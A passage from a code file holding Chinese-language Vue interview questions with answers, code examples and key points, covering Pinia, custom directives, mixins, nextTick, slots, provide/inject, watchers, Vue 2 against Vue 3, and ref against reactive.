                codeExample: `// Pinia Setup Store\nimport { defineStore } from "pinia"\nimport { ref, computed } from "vue"\n\nexport const useCartStore = defineStore("cart", () => {\n  // state\n  const items = ref([])\n  // getters\n  const total = computed(() => items.value.reduce((s, i) => s + i.price, 0))\n  const count = computed(() => items.value.length)\n  // actions（同步/异步均可）\n  function addItem(item) { items.value.push(item) }\n  function removeItem(id) { items.value = items.value.filter((i) => i.id !== id) }\n  async function checkout() {\n    await api.createOrder(items.value)\n    items.value = []\n  }\n  return { items, total, count, addItem, removeItem, checkout }\n})\n\n// 组件中使用\n<script setup>\nimport { useCartStore } from "@/stores/cart"\nimport { storeToRefs } from "pinia"\nconst cart = useCartStore()\nconst { items, total, count } = storeToRefs(cart) // 解构保持响应式\nconst { addItem, checkout } = cart // actions 直接解构\n</script>\n\n<template>\n  <div>共 {{ count }} 件，总计 {{ total }}</div>\n  <button @click="addItem({ id: 1, price: 99 })">添加</button>\n  <button @click="checkout">结算</button>\n</template>`,
                difficulty: 'medium',
                tags: ['Pinia', 'Vuex', '状态管理'],
                keyPoints: ['Pinia 无 mutation', '扁平化模块无嵌套', 'TS 支持优秀', 'Setup Store 与 Composition API 一致'],
              },
              {
                id: 'vue-custom-directives',
                domain: 'vue',
                question: 'Vue 自定义指令的钩子函数？常用场景有哪些？',
                shortAnswer: 'Vue 3 指令钩子：created、beforeMount、mounted、beforeUpdate、updated、beforeUnmount、unmounted。常用场景：v-focus 自动聚焦、v-permission 权限控制、v-loading 加载、v-debounce 防抖、v-intersection 懒加载。',
                detailedAnswer: '自定义指令钩子（Vue 3）：\n- created：元素属性和事件监听器设置前\n- beforeMount：元素挂载前\n- mounted：元素挂载后（最常用）\n- beforeUpdate：更新前\n- updated：更新后\n- beforeUnmount：卸载前\n- unmounted：卸载后\n\n钩子参数：\n- el：指令绑定的元素\n- binding：{ value, oldValue, arg, modifiers }\n  - value：指令绑定的值\n  - arg：参数（v-my:foo 中的 foo）\n  - modifiers：修饰符对象（v-my.a.b 中的 {a:true, b:true}）\n- vnode：虚拟节点\n- prevVnode：上一个虚拟节点\n\nVue 2 vs Vue 3 钩子变化：\n- bind → beforeMount\n- inserted → mounted\n- update/beforeUpdate：Vue 3 用 beforeUpdate/updated\n- componentUpdated → updated\n- unbind → unmounted\n\n注册方式：\n- 全局：app.directive("focus", { ... })\n- 局部：directives: { focus: { ... } }\n- <script setup>：const vFocus = { mounted: (el) => el.focus() }（变量名 v 开头自动识别）\n\n常用场景：\n1. v-focus：自动聚焦\n2. v-permission：权限控制，无权限移除元素\n3. v-loading：loading 遮罩\n4. v-debounce：防抖点击\n5. v-intersection：IntersectionObserver 懒加载\n6. v-copy：复制到剪贴板\n7. v-drag：拖拽\n8. v-longpress：长按',
                codeExample: `// 1. v-focus 自动聚焦\napp.directive("focus", {\n  mounted(el) {\n    el.focus()\n  },\n})\n// 使用：<input v-focus />\n\n// 2. v-permission 权限控制\napp.directive("permission", {\n  mounted(el, binding) {\n    const hasPermission = checkUserPermission(binding.value)\n    if (!hasPermission) {\n      el.parentNode?.removeChild(el)\n    }\n  },\n})\n// 使用：<button v-permission="'admin'">删除</button>\n\n// 3. v-debounce 防抖\napp.directive("debounce", {\n  mounted(el, binding) {\n    const { value: handler, arg: delay = 300 } = binding\n    let timer\n    el.addEventListener("click", () => {\n      clearTimeout(timer)\n      timer = setTimeout(() => handler(), Number(delay))\n    })\n  },\n})\n// 使用：<button v-debounce:500="handleClick">点击</button>\n\n// 4. <script setup> 中局部指令\n<script setup>\nconst vFocus = {\n  mounted: (el) => el.focus(),\n}\nconst vPermission = {\n  mounted: (el, binding) => {\n    if (!checkPermission(binding.value)) el.remove()\n  },\n}\n</script>\n<template>\n  <input v-focus />\n  <button v-permission="'admin'">删除</button>\n</template>`,
                difficulty: 'medium',
                tags: ['Vue', '自定义指令', 'directives'],
                keyPoints: ['Vue 3 钩子加 before/un 前缀', '钩子参数 el/binding/vnode', '常用 v-focus/v-permission/v-debounce', 'script setup 中 v 开头变量自动识别'],
              },
              {
                id: 'vue-mixins-composition',
                domain: 'vue',
                question: 'Vue 2 mixins 的问题？Composition API 如何解决？',
                shortAnswer: 'mixins 问题：命名冲突（后覆盖前）、来源不清（不知数据从哪个 mixin 来）、类型推断差。Composition API 通过自定义 Hook（useXxx）解决：逻辑显式引入、无命名冲突、TS 类型推断好。',
                detailedAnswer: 'Vue 2 mixins 的问题：\n\n1. 命名冲突：\n- 多个 mixin 有同名属性/方法，后者覆盖前者\n- 隐式覆盖，难发现\n- 例：mixinA.data.count 和 mixinB.data.count 冲突\n\n2. 来源不清：\n- 组件中 this.xxx 不知来自哪个 mixin\n- 阅读组件需翻所有 mixin\n- 调试困难\n\n3. 类型推断差：\n- mixin 合并后 this 类型复杂\n- TS 难以准确推断\n\n4. 复用不灵活：\n- mixin 是全局合并，无法按需取用\n- 不能传参定制\n\nComposition API 解决方案（自定义 Hook）：\n\n1. 显式引入：\n- import { useMouse } from "./useMouse"\n- 来源清晰，IDE 可跳转\n\n2. 无命名冲突：\n- const { x: mouseX, y: mouseY } = useMouse()\n- const { x: scrollX } = useScroll()\n- 可重命名解构\n\n3. 类型推断好：\n- 普通函数，TS 自然推断返回类型\n\n4. 灵活传参：\n- useFetch(url, options) 可定制\n- 同一 Hook 多次调用各自独立\n\n5. 逻辑聚合：\n- 相关 state/methods/effect 在同一函数\n- 组件中按功能组织，不分散\n\n对比示例：\n```\n// Vue 2 mixins\n// mouseMixin.js\nexport const mouseMixin = {\n  data() { return { x: 0, y: 0 } },\n  mounted() { window.addEventListener("mousemove", this.update) },\n  beforeDestroy() { window.removeEventListener("mousemove", this.update) },\n  methods: { update(e) { this.x = e.pageX; this.y = e.pageY } },\n}\n// 组件中\nimport { mouseMixin } from "./mouseMixin"\nexport default { mixins: [mouseMixin] } // this.x 来源不清\n\n// Vue 3 Composition API\n// useMouse.ts\nexport function useMouse() {\n  const x = ref(0), y = ref(0)\n  function update(e) { x.value = e.pageX; y.value = e.pageY }\n  onMounted(() => window.addEventListener("mousemove", update))\n  onBeforeUnmount(() => window.removeEventListener("mousemove", update))\n  return { x, y }\n}\n// 组件中\nconst { x, y } = useMouse() // 显式来源\n```\n\n迁移建议：\n- Vue 3 项目用 Composition API，不再用 mixin\n- 渐进迁移：旧 mixin 保留，新功能用 Hook\n- 用 vue-class-component 也可（但官方推荐 Composition）',
                codeExample: `// Vue 2 mixins 问题演示\n// mixinA.js\nexport default {\n  data: () => ({ count: 0 }), // 与 mixinB 冲突！\n  methods: { log() { console.log("A") } },\n}\n// mixinB.js\nexport default {\n  data: () => ({ count: 100 }), // 覆盖 mixinA\n  methods: { log() { console.log("B") } }, // 覆盖 mixinA\n}\n// 组件\nexport default {\n  mixins: [mixinA, mixinB],\n  mounted() {\n    console.log(this.count) // 100（B 覆盖 A）\n    this.log() // "B"（来源不清）\n  },\n}\n\n// Vue 3 Composition API 解决\n// useCounterA.ts\nexport function useCounterA(initial = 0) {\n  const count = ref(initial)\n  const log = () => console.log("A", count.value)\n  return { count, log }\n}\n// useCounterB.ts\nexport function useCounterB(initial = 100) {\n  const count = ref(initial)\n  const log = () => console.log("B", count.value)\n  return { count, log }\n}\n// 组件\nconst { count: countA, log: logA } = useCounterA(0) // 重命名解构\nconst { count: countB, log: logB } = useCounterB(100)\n// 无冲突，来源清晰`,
                difficulty: 'medium',
                tags: ['Vue', 'mixins', 'Composition API'],
                keyPoints: ['mixins 命名冲突隐式覆盖', 'mixins 来源不清类型差', 'Composition 自定义 Hook 显式引入', '可重命名解构避免冲突'],
              },
              {
                id: 'vue-nexttick',
                domain: 'vue',
                question: 'Vue 中 nextTick 的作用和原理？',
                shortAnswer: 'nextTick 在下次 DOM 更新循环结束后执行回调，确保拿到更新后的 DOM。原理：Vue 把 DOM 更新放微任务队列（Promise.then），nextTick 也用微任务，在 DOM 更新后执行。',
                detailedAnswer: 'nextTick 作用：\n- 在数据变化后等待 DOM 更新完成再执行回调\n- 确保能拿到更新后的 DOM\n- 例：this.message = "new"; this.$nextTick(() => { /* DOM 已更新 */ })\n\n原理：\n\nVue 的异步更新队列：\n- 数据变化不会立即更新 DOM\n- Vue 把更新放入队列，在 nextTick 中批量执行（去重、合并）\n- 避免重复计算，提升性能\n\nnextTick 实现（Vue 3）：\n- 用 Promise.resolve().then() 微任务\n- 兼容：Promise → MutationObserver → setImmediate → setTimeout\n- Vue 3 默认用 Promise（现代浏览器都支持）\n\n执行顺序：\n```\nthis.message = "new"  // 1. 数据变化，DOM 更新任务入队\nthis.$el.textContent // 2. 此时 DOM 还没更新（旧值）\nthis.$nextTick(() => {\n  this.$el.textContent // 3. DOM 已更新（新值）\n})\n```\n\nVue 2 vs Vue 3：\n- Vue 2：nextTick 用 microtask（Promise/MutationObserver），特殊场景用 macrotask（setImmediate/setTimeout）\n- Vue 3：固定用 microtask（Promise），更可预测\n\n使用场景：\n1. 数据变化后立即操作 DOM\n2. 修改数据后获取更新后的元素尺寸/位置\n3. 配合 transition 等\n4. 测试中等待 DOM 更新\n\nVue 3 Composition API：\n```\nimport { nextTick } from "vue"\nconst message = ref("old")\nasync function update() {\n  message.value = "new"\n  await nextTick() // 等待 DOM 更新\n  console.log(document.getElementById("msg").textContent) // "new"\n}\n```\n\n注意：\n- 不要滥用 nextTick，能用 computed 就用\n- nextTick 是异步的，注意执行顺序\n- 多次 nextTick 按调用顺序执行',
                codeExample: `// 1. 基础用法\nimport { ref, nextTick } from "vue"\n\nconst message = ref("old")\nconst elRef = ref(null)\n\nasync function update() {\n  message.value = "new"\n  console.log(elRef.value.textContent) // "old"（DOM 还没更新）\n  await nextTick() // 等待 DOM 更新\n  console.log(elRef.value.textContent) // "new"（DOM 已更新）\n}\n\n// 2. 应用场景：列表滚动到底部\nconst messages = ref([])\nconst listRef = ref(null)\nasync function addMessage(msg) {\n  messages.value.push(msg)\n  await nextTick() // 等 DOM 渲染新消息\n  listRef.value.scrollTop = listRef.value.scrollHeight // 滚动到底\n}\n\n// 3. 应用场景：focus 新输入框\nconst showInput = ref(false)\nconst inputRef = ref(null)\nasync function toggleInput() {\n  showInput.value = true\n  await nextTick() // 等输入框渲染\n  inputRef.value.focus()\n}\n\n// 4. Vue 2 用法\nthis.message = "new"\nthis.$nextTick(() => {\n  console.log(this.$el.textContent) // "new"\n})`,
                difficulty: 'medium',
                tags: ['Vue', 'nextTick', '异步更新'],
                keyPoints: ['数据变化后等 DOM 更新', 'Vue 3 用 Promise 微任务', '批量更新避免重复', '操作更新后 DOM 用'],
              },
              {
                id: 'vue-slots',
                domain: 'vue',
                question: 'Vue 插槽（slot）有哪些类型？作用域插槽是什么？',
                shortAnswer: '三种：默认插槽（无 name）、具名插槽（v-slot:name/#name）、作用域插槽（子传数据给父，父用 v-slot 接收）。作用域插槽让父组件根据子组件数据自定义渲染内容，常用于列表/表格组件。',
                detailedAnswer: 'Vue 插槽类型：\n\n1. 默认插槽（Default Slot）：\n- 子组件用 <slot></slot> 占位\n- 父组件传入的内容填充到占位处\n- 一个组件只能有一个默认插槽\n\n2. 具名插槽（Named Slot）：\n- 子组件 <slot name="header"></slot>\n- 父组件 <template v-slot:header> 或 #header\n- 可有多个具名插槽\n\n3. 作用域插槽（Scoped Slot）：\n- 子组件向父组件传递数据\n- 子组件 <slot :item="item" :index="index"></slot>\n- 父组件 <template v-slot:default="{ item, index }"> 或 #default="{ item }"\n- 让父组件根据子组件数据自定义渲染\n\n作用域插槽的应用：\n- 列表组件：子组件提供 item，父组件决定渲染样式\n- 表格组件：子组件提供 row，父组件定制单元格\n- 可复用组件：父组件完全控制内容渲染\n\nv-slot 语法：\n- v-slot:default（默认插槽，可省略为 v-slot）\n- v-slot:header（具名插槽）\n- #header（简写）\n- v-slot:default="{ item }"（作用域插槽）\n- #default="{ item }"（简写）\n\nVue 2 vs Vue 3：\n- Vue 2：slot="header" slot-scope="props"\n- Vue 3：v-slot:header="props" 或 #header="props"\n- Vue 3 v-slot 必须用在 <template> 上（除默认插槽可单独用在组件上）\n\n动态插槽名：\n- v-slot:[dynamicName]\n- 根据数据动态切换插槽',
                codeExample: `// 1. 默认插槽\n// 子组件 Card.vue\n<template>\n  <div class="card">\n    <slot></slot> <!-- 父组件内容填充 -->\n  </div>\n</template>\n// 父组件\n<Card>\n  <p>这是卡片内容</p>\n</Card>\n\n// 2. 具名插槽\n// 子组件 Layout.vue\n<template>\n  <div>\n    <header><slot name="header"></slot></header>\n    <main><slot></slot></main> <!-- 默认 -->\n    <footer><slot name="footer"></slot></footer>\n  </div>\n</template>\n// 父组件\n<Layout>\n  <template #header>\n    <h1>标题</h1>\n  </template>\n  <p>主体内容</p> <!-- 默认插槽 -->\n  <template #footer>\n    <p>底部</p>\n  </template>\n</Layout>\n\n// 3. 作用域插槽\n// 子组件 List.vue\n<template>\n  <ul>\n    <li v-for="(item, index) in items" :key="item.id">\n      <slot :item="item" :index="index" :last="index === items.length - 1">\n        <!-- 默认渲染（父组件未提供插槽时） -->\n        {{ item.name }}\n      </slot>\n    </li>\n  </ul>\n</template>\n// 父组件：自定义每项渲染\n<List :items="users">\n  <template #default="{ item, index, last }">\n    <span :style="{ color: last ? 'red' : 'black' }">\n      {{ index + 1 }}. {{ item.name }}\n    </span>\n    <button @click="remove(item.id)">删除</button>\n  </template>\n</List>\n\n// 4. 动态插槽名\n<template #[slotName]>Content</template>\n<script setup>\nconst slotName = ref("header")\n</script>`,
                difficulty: 'medium',
                tags: ['Vue', '插槽', 'slot', '作用域插槽'],
                keyPoints: ['默认/具名/作用域三种', 'v-slot:# 简写', '作用域插槽子传父数据', '常用于列表/表格自定义渲染'],
              },
              {
                id: 'vue-provide-inject',
                domain: 'vue',
                question: 'Vue 中 provide/inject 的原理和使用？与 React Context 的区别？',
                shortAnswer: 'provide 在祖先组件注入数据，inject 在后代组件接收，跨多层传递。Vue 3 需用 ref/reactive 保持响应式。与 React Context 类似，但 Vue 是显式依赖注入，React 是单向数据流。',
                detailedAnswer: 'provide/inject 原理：\n\n- 祖先组件 provide(key, value) 注入数据\n- 后代组件 inject(key, default) 接收\n- 跨任意层级传递，无需层层 props\n- Vue 内部用组件实例的 _provided 链查找\n\nVue 2 vs Vue 3：\n- Vue 2：provide 是对象（非响应式），inject 是字符串数组/对象\n- Vue 3：provide 是函数调用，可用 ref/reactive 保持响应式\n\nVue 3 用法：\n```\n// 祖先\nimport { provide, ref } from "vue"\nconst theme = ref("dark")\nconst toggleTheme = () => theme.value = theme.value === "dark" ? "light" : "dark"\nprovide("theme", theme)\nprovide("toggleTheme", toggleTheme)\n\n// 后代\nimport { inject } from "vue"\nconst theme = inject("theme")        // 响应式 ref\nconst toggleTheme = inject("toggleTheme")\n```\n\n响应式：\n- 直接 provide 原始值：不响应式\n- provide ref/reactive 对象：响应式\n- 后代修改需通过 provide 的方法（保持单向数据流）\n\n默认值：\n- inject(key, defaultValue)\n- 第二参数是默认值，找不到时返回\n- 可用函数：inject(key, () => defaultValue)\n\nTypeScript 增强：\n- 用 InjectionKey<T> 提供类型安全\n- const themeKey: InjectionKey<Ref<string>> = Symbol()\n- provide(themeKey, ref("dark"))\n- const theme = inject(themeKey) // 自动推断类型\n\n与 React Context 区别：\n\n| 维度 | Vue provide/inject | React Context |\n|------|-------------------|---------------|\n| 数据流 | 显式依赖注入 | 单向数据流 |\n| 触发更新 | 响应式自动追踪 | Provider value 变化触发 |\n| 性能 | 精准依赖追踪 | 整个 consumer 重渲染 |\n| 默认值 | inject 第二参数 | createContext 默认值 |\n| 范围 | 组件树任意层级 | 组件树任意层级 |\n\n使用场景：\n- 主题切换（多组件用同一主题）\n- 国际化（i18n）\n- 表单组件上下文（el-form 给 el-input 提供校验）\n- 路由/状态注入\n\n注意：\n- 不推荐跨多层随意用（数据来源难追踪）\n- 适合组件库内部使用\n- 应用级状态用 Pinia',
                codeExample: `// 1. 基础用法\n// 祖先 App.vue\n<script setup>\nimport { provide, ref, readonly } from "vue"\nconst theme = ref("dark")\nconst user = ref({ name: "Alice" })\n// 提供 readonly 防止后代直接改\nprovide("theme", readonly(theme))\nprovide("setTheme", (val) => (theme.value = val))\nprovide("user", readonly(user))\n</script>\n\n// 后代任意层级 Header.vue\n<script setup>\nimport { inject } from "vue"\nconst theme = inject("theme") // Ref<string>\nconst setTheme = inject("setTheme")\n// theme.value 只读，setTheme 修改\n</script>\n<template>\n  <header :class="theme">\n    <button @click="setTheme(theme === 'dark' ? 'light' : 'dark')">\n      切换主题\n    </button>\n  </header>\n</template>\n\n// 2. TypeScript 类型安全\nimport type { InjectionKey, Ref } from "vue"\nexport const ThemeKey: InjectionKey<Ref<string>> = Symbol("theme")\n// 祖先\nprovide(ThemeKey, ref("dark"))\n// 后代\nconst theme = inject(ThemeKey) // Ref<string> | undefined\nif (!theme) throw new Error("theme not provided")\n\n// 3. 默认值\nconst theme = inject("theme", "light") // 找不到用 "light"`,
                difficulty: 'medium',
                tags: ['Vue', 'provide/inject', '依赖注入'],
                keyPoints: ['祖先 provide 后代 inject', 'Vue 3 用 ref/reactive 保持响应式', 'readonly 防直接修改', 'InjectionKey 类型安全'],
              },
              {
                id: 'vue-watch-watcheffect',
                domain: 'vue',
                question: 'Vue 3 中 watch 和 watchEffect 的区别？',
                shortAnswer: 'watch 显式指定监听的源，可拿到新旧值，惰性执行（默认不立即执行）。watchEffect 自动收集依赖，立即执行一次，拿不到旧值。需立即执行且不关心旧值用 watchEffect，需旧值或精确控制用 watch。',
                detailedAnswer: 'watch：\n- 显式指定监听源（ref/reactive/getter 数组）\n- 回调拿到 (newVal, oldVal)\n- 默认惰性（不立即执行）\n- 可配置 immediate、deep、flush\n- 适合需要旧值或精确控制的场景\n\nwatchEffect：\n- 自动收集依赖（回调中用到的响应式数据）\n- 立即执行一次（同步收集依赖）\n- 回调无参数，拿不到旧值\n- 适合副作用（如发请求、操作 DOM）\n- 返回 stop 函数可停止\n\n区别：\n\n| 维度 | watch | watchEffect |\n|------|-------|-------------|\n| 依赖 | 显式指定 | 自动收集 |\n| 执行时机 | 默认惰性 | 立即执行一次 |\n| 新旧值 | 有 (newVal, oldVal) | 无 |\n| 适合 | 需要旧值/精确控制 | 副作用/不关心旧值 |\n| 多源 | 支持（数组） | 不支持 |\n\nwatch 用法：\n```\n// 监听 ref\nconst count = ref(0)\nwatch(count, (newVal, oldVal) => {\n  console.log(newVal, oldVal)\n})\n\n// 监听 reactive（需 deep 或 getter）\nconst state = reactive({ user: { name: "" } })\nwatch(() => state.user.name, (newVal) => { ... }) // 监听具体属性\nwatch(state, (newVal) => { ... }, { deep: true }) // 深度监听整个对象\n\n// 监听多个源\nwatch([count, () => state.user.name], ([newCount, newName], [oldCount, oldName]) => {})\n\n// 配置\nwatch(count, callback, {\n  immediate: true, // 立即执行一次\n  deep: true,      // 深度监听\n  flush: "post",   // post（DOM 更新后）/ pre（默认，DOM 更新前）/ sync（同步）\n})\n```\n\nwatchEffect 用法：\n```\nconst userId = ref(1)\nconst keyword = ref("")\n\nconst stop = watchEffect(() => {\n  // 自动收集 userId 和 keyword 作为依赖\n  fetchUser(userId.value, keyword.value)\n})\n// 任一变化都会重新执行\n\nstop() // 停止监听\n\n// 清理副作用\nwatchEffect((onCleanup) => {\n  const timer = setTimeout(() => fetch(userId.value), 300)\n  onCleanup(() => clearTimeout(timer)) // 重新执行前清理\n})\n```\n\n使用场景：\n- watch：表单字段变化校验、路由变化重新请求、需对比旧值\n- watchEffect：响应式数据变化自动发请求、操作 DOM、订阅\n\n选择建议：\n- 需要旧值 → watch\n- 精确控制监听哪些数据 → watch\n- 立即执行 + 自动依赖 → watchEffect\n- 副作用清理 → 两者都支持 onCleanup',
                codeExample: `// 1. watch 基础用法\nimport { ref, watch } from "vue"\nconst count = ref(0)\nconst name = ref("Alice")\n\n// 监听单个 ref\nwatch(count, (newVal, oldVal) => {\n  console.log(oldVal + " -> " + newVal)\n})\n\n// 监听多个源\nwatch([count, name], ([newCount, newName], [oldCount, oldName]) => {\n  console.log("count:", newCount, "name:", newName)\n})\n\n// 监听 reactive 属性\nimport { reactive } from "vue"\nconst state = reactive({ user: { age: 18 } })\nwatch(\n  () => state.user.age, // getter 函数\n  (newAge) => console.log("age changed:", newAge)\n)\n\n// immediate + deep\nwatch(\n  state,\n  (newState) => console.log("state changed", newState),\n  { immediate: true, deep: true }\n)\n\n// 2. watchEffect 副作用\nimport { watchEffect } from "vue"\nconst userId = ref(1)\nwatchEffect((onCleanup) => {\n  const controller = new AbortController()\n  fetch(\`/api/user/\${userId.value}\`, { signal: controller.signal })\n    .then((r) => r.json())\n    .then(console.log)\n  onCleanup(() => controller.abort()) // 取消旧请求\n})\n\n// 3. flush 时机\nimport { watch } from "vue"\nwatch(count, callback, { flush: "post" }) // DOM 更新后执行（类似 nextTick）\nwatch(count, callback, { flush: "sync" }) // 同步执行（不推荐，可能死循环）`,
                difficulty: 'medium',
                tags: ['Vue3', 'watch', 'watchEffect'],
                keyPoints: ['watch 显式监听有新旧值', 'watchEffect 自动收集立即执行', 'watch 适合需旧值/精确控制', 'watchEffect 适合副作用'],
              },
              {
                id: 'vue2-vs-vue3',
                domain: 'vue',
                question: 'Vue 2 和 Vue 3 的核心区别？',
                shortAnswer: '响应式：Object.defineProperty → Proxy。API：Options → Composition。性能：编译期优化（静态提升/PatchFlag/BlockTree）。新特性：Teleport、Suspense、Fragment、多根节点。TS 支持、Tree-shaking 更好。体积更小。',
                detailedAnswer: 'Vue 2 vs Vue 3 核心区别：\n\n1. 响应式系统：\n- Vue 2：Object.defineProperty，劫持属性 get/set\n  - 无法监听新增属性（需 Vue.set）\n  - 无法监听数组索引/length 变化（需重写数组方法）\n  - 深度监听需递归遍历\n- Vue 3：Proxy，代理整个对象\n  - 监听新增/删除属性\n  - 监听数组变化\n  - 惰性响应式（访问时才递归）\n  - 性能更好\n\n2. API 风格：\n- Vue 2：Options API（data/methods/computed）\n- Vue 3：Composition API（setup 函数）+ Options API\n  - 逻辑聚合、易复用、TS 友好\n  - <script setup> 语法糖\n\n3. 性能优化（编译期）：\n- Vue 3 编译期静态优化\n- 静态提升：静态节点提到 render 外复用\n- PatchFlag：动态节点标记，Diff 只比较动态部分\n- BlockTree：以动态节点为根，跳过静态\n- 缓存事件处理器\n- 整体性能提升 1.3~2 倍\n\n4. 新特性：\n- Fragment：多根节点（Vue 2 必须单根）\n- Teleport：组件渲染到外部 DOM（如弹窗）\n- Suspense：异步组件 loading 状态\n- createApp：替代 new Vue（更模块化）\n- 全局 API 摇树优化（app.directive 而非 Vue.directive）\n\n5. TypeScript 支持：\n- Vue 2：类型支持弱（vue-class-component 或 vue-property-decorator）\n- Vue 3：源码用 TS 重写，类型推断原生支持\n\n6. 体积和 Tree-shaking：\n- Vue 2：全局 API 难摇树（Vue.nextTick 等）\n- Vue 3：模块化导入，按需打包\n- 体积减少 ~40%\n\n7. 内置组件：\n- Vue 3 新增 Teleport、Suspense\n- keep-alive 改进（include/exclude 支持）\n- transition API 调整\n\n8. 生命周期变化：\n- beforeDestroy → beforeUnmount\n- destroyed → unmounted\n- 新增 setup（替代 beforeCreate/created）\n\n9. 其他：\n- v-model 变化：modelValue + update:modelValue，支持多个 v-model\n- v-if/v-for 优先级反转（v-if 优先）\n- filter 过滤器移除（用 computed/methods 替代）\n- $on/$off/$once 移除（EventBus 不再内置）\n- 函数式组件语法变化\n\n迁移建议：\n- 新项目直接用 Vue 3\n- Vue 2 项目用 @vue/compat 迁移桥接\n- 用 Vue CLI / Vite 创建 Vue 3 项目\n- 团队学习成本主要在 Composition API',
                codeExample: `// 1. 响应式对比\n// Vue 2\nnew Vue({\n  data: { user: { name: "Alice" } },\n  mounted() {\n    this.user.age = 18 // ❌ 不响应式\n    this.$set(this.user, "age", 18) // ✅\n    this.user.name = "Bob" // ✅\n  },\n})\n// Vue 3\nimport { reactive } from "vue"\nconst user = reactive({ name: "Alice" })\nuser.age = 18 // ✅ 自动响应式\n\ndefineProperty(obj, "name", {\n  get() { /* ... */ },\n  set(newVal) { /* ... */ },\n}) // 劫持单个属性\n\nnew Proxy(obj, {\n  get(target, key) { /* ... */ return Reflect.get(target, key) },\n  set(target, key, value) { /* ... */ return Reflect.set(target, key, value) },\n  deleteProperty(target, key) { /* ... */ return Reflect.deleteProperty(target, key) },\n}) // 代理整个对象\n\n// 2. 创建应用\n// Vue 2\nimport Vue from "vue"\nnew Vue({ render: (h) => h(App) }).$mount("#app")\nVue.use(Vuex) // 全局\nVue.directive("focus", {}) // 全局\n\n// Vue 3\nimport { createApp } from "vue"\nconst app = createApp(App)\napp.use(pinia) // 实例上挂载\napp.directive("focus", {})\napp.mount("#app")\n\n// 3. 新特性 Teleport\nimport { Teleport } from "vue"\n<template>\n  <Teleport to="body">\n    <div class="modal">弹窗内容</div>\n  </Teleport>\n</template>\n\n// 4. Fragment 多根节点\n<template>\n  <header>...</header>\n  <main>...</main>\n  <footer>...</footer>\n</template>\n// Vue 2 必须包一层 <div>`,
                difficulty: 'hard',
                tags: ['Vue2', 'Vue3', '区别'],
                keyPoints: ['Proxy 替代 defineProperty', 'Composition API 替代 Options', '编译期静态优化', '新增 Teleport/Suspense/Fragment'],
              },
              {
                id: 'vue-ref-vs-reactive',
                domain: 'vue',
                question: 'Vue 3 中 ref 和 reactive 的区别？何时用哪个？',
                shortAnswer: 'ref 包裹基本类型（也支持对象），用 .value 访问；reactive 只能包裹对象，直接访问属性。基本类型必须用 ref，对象两者都行。建议：基本类型用 ref，对象/数组用 reactive，可读性更好。',
                detailedAnswer: 'ref vs reactive：\n\n| 维度 | ref | reactive |\n|------|-----|----------|\n| 类型 | 基本类型 + 对象 | 仅对象（Object/Array/Map/Set） |\n| 访问 | .value（JS 中） | 直接访问属性 |\n| 模板 | 自动解包（不需 .value） | 直接访问 |\n| 响应式 | Object.defineProperty（ref 内部） | Proxy |\n| 重新赋值 | ref.value = newVal ✅ | reactiveObj = newObj ❌（丢失响应） |\n| 解构 | 失去响应式（需 toRefs） | 失去响应式（需 toRefs） |\n\nref 原理：\n- 内部用 RefImpl 类，get 触发 track，set 触发 trigger\n- 对象类型 ref 内部用 reactive 包裹\n- 模板中自动解包（编译时处理）\n\nreactive 原理：\n- 用 Proxy 代理整个对象\n- 深度响应式（嵌套对象也响应）\n- 惰性响应式（访问时才递归代理）\n\n使用场景：\n- 基本类型（string/number/boolean）：必须用 ref\n- 对象/数组：两者皆可\n  - ref：重新赋值方便（ref.value = newObj）\n  - reactive：访问简洁（state.count 而非 state.value.count）\n- 函数返回值用 ref（避免 reactive 重新赋值问题）\n\n常见坑：\n1. reactive 重新赋值丢失响应式：\n```\nconst state = reactive({ count: 0 })\nstate = reactive({ count: 1 }) // ❌ 丢失响应式\n// 解决：\nstate.count = 1               // ✅ 修改属性\n// 或用 ref\nconst state = ref({ count: 0 })\nstate.value = { count: 1 }    // ✅\n```\n2. 解构丢失响应式：\n```\nconst state = reactive({ count: 0, name: "A" })\nconst { count, name } = state // ❌ 失去响应式\n// 解决：toRefs\nconst { count, name } = toRefs(state) // ✅\n```\n3. ref 在模板中解包，在 JS 中需 .value：\n```\nconst count = ref(0)\nconsole.log(count)       // RefImpl 对象\nconsole.log(count.value) // 0\n// 模板中\n<div>{{ count }}</div>   // 自动解包，显示 0\n```\n\n选择建议：\n- 简单状态：基本类型用 ref，对象用 reactive\n- 复杂对象且需重新赋值：用 ref\n- 不确定时统一用 ref（更安全）\n- 团队约定统一风格',
                codeExample: `// 1. 基本类型用 ref\nconst count = ref(0)\nconst name = ref("Alice")\nconst isActive = ref(false)\ncount.value++ // 修改\nconsole.log(count.value) // 访问\n\n// 2. 对象用 reactive\nconst state = reactive({\n  user: { name: "Alice", age: 18 },\n  list: [1, 2, 3],\n})\nstate.user.name = "Bob" // 直接修改\nstate.list.push(4)       // 直接修改\n\n// 3. reactive 重新赋值问题\nconst state = reactive({ count: 0 })\n// ❌ 错误：丢失响应式\nfunction reset() {\n  state = reactive({ count: 0 })\n}\n// ✅ 方案1：修改属性\nfunction reset() {\n  state.count = 0\n}\n// ✅ 方案2：用 ref\nconst state = ref({ count: 0 })\nfunction reset() {\n  state.value = { count: 0 }\n}\n\n// 4. 解构保持响应式\nconst state = reactive({ count: 0, name: "A" })\n// ❌ 失去响应式\nconst { count, name } = state\n// ✅ toRefs\nconst { count, name } = toRefs(state)\ncount.value++ // 修改会影响 state\n\n// 5. 模板中 ref 自动解包\n<script setup>\nconst count = ref(0)\n</script>\n<template>\n  <div>{{ count }}</div> <!-- 不需要 .value -->\n  <button @click="count++">+1</button>\n</template>`,
                difficulty: 'medium',
                tags: ['Vue3', 'ref', 'reactive'],
                keyPoints: ['ref 支持基本类型 .value 访问', 'reactive 仅对象直接访问', 'reactive 重新赋值丢失响应', '解构需 toRefs 保持响应'],
              },
              {
                id: 'vue-shallow-reactive',
                domain: 'vue',
                question: 'shallowRef 和 shallowReactive 的作用？何时使用？',
                shortAnswer: 'shallowRef/shallowReactive 只做浅层响应式，深层修改不触发更新。用于大对象优化性能、避免深度代理开销，或第三方对象（如图表实例）不需要深度响应式。',
